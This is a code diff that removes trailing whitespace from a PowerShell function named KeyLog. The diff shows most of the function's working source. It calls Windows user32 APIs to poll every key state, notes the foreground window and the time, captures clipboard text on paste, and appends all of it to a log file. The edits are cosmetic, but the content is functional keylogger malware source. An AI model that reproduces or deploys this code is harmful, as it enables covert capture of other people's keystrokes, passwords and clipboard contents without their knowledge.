@@ -1,14 +1,14 @@
-function KeyLog($logfile) 
+function KeyLog($logfile)
 {
     $MAPVK_VK_TO_VSC = 0x00
     $MAPVK_VSC_TO_VK = 0x01
     $MAPVK_VK_TO_CHAR = 0x02
     $MAPVK_VSC_TO_VK_EX = 0x03
     $MAPVK_VK_TO_VSC_EX = 0x04
-    
+
     $virtualkc_sig = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
 '@
     $kbstate_sig = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -35,13 +35,13 @@ public static extern int GetForegroundWindow();
 
     $processId = $PID
     $parentProcessId = (Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $processId").ParentProcessId
-    
+
     $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     $oldWindow = 0
 
     [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
-    
-    while ($true) 
+
+    while ($true)
     {
         Start-Sleep -Milliseconds 20
 
@@ -53,32 +53,32 @@ public static extern int GetForegroundWindow();
             }
             exit
         }
-        
+
         $gotit = ""
-        for ($char = 1; $char -le 254; $char++) 
+        for ($char = 1; $char -le 254; $char++)
         {
             $vkey = $char
-            $gotit = $getKeyState::GetAsyncKeyState($vkey)	
-            if ($gotit -eq -32767) 
-            {	
+            $gotit = $getKeyState::GetAsyncKeyState($vkey)
+            if ($gotit -eq -32767)
+            {
                 try
-                {				
+                {
                     $l_shift = $getKeyState::GetAsyncKeyState(160)
                     $r_shift = $getKeyState::GetAsyncKeyState(161)
                     $l_ctrl = $getKeyState::GetAsyncKeyState(162)
                     $r_ctrl = $getKeyState::GetAsyncKeyState(163)
                     $caps_lock = [console]::CapsLock
-                
-                    $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)			
+
+                    $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
                     $kbstate = New-Object Byte[] 256
-                    $checkkbstate = $getKBState::GetKeyboardState($kbstate)		
+                    $checkkbstate = $getKBState::GetKeyboardState($kbstate)
                     $mychar = New-Object -TypeName "System.Text.StringBuilder";
-                    $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)		
-                    
-                    if ($unicode_res -gt 0) 
-                    {						
+                    $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
+
+                    if ($unicode_res -gt 0)
+                    {
                         $topWindow = $getWindow::GetForegroundWindow()
-                        if ($topWindow -ne $oldWindow) 
+                        if ($topWindow -ne $oldWindow)
                         {
                             $time = Get-Date -format "dd/mm/yyyy HH:mm"
                             $oldWindow = $topWindow
@@ -99,11 +99,11 @@ public static extern int GetForegroundWindow();
                             }
                             if ($c -eq 22)
                             {
-                                if ([System.Windows.Forms.Clipboard]::GetText() -ne ""){    
-                                    $str += "{" + [System.Windows.Forms.Clipboard]::GetText() + "}"  
+                                if ([System.Windows.Forms.Clipboard]::GetText() -ne ""){
+                                    $str += "{" + [System.Windows.Forms.Clipboard]::GetText() + "}"
                                 }
                                 else {
-                                    $str += "{}"   
+                                    $str += "{}"
                                 }
                             }
                             [System.IO.File]::AppendAllText($logfile, $str, [System.Text.Encoding]::Unicode)
@@ -111,7 +111,7 @@ public static extern int GetForegroundWindow();
                         else
                         {
                             [System.IO.File]::AppendAllText($logfile, $mychar, [System.Text.Encoding]::Unicode)
-                        }					
+                        }
                     }
                 } catch { }
             }
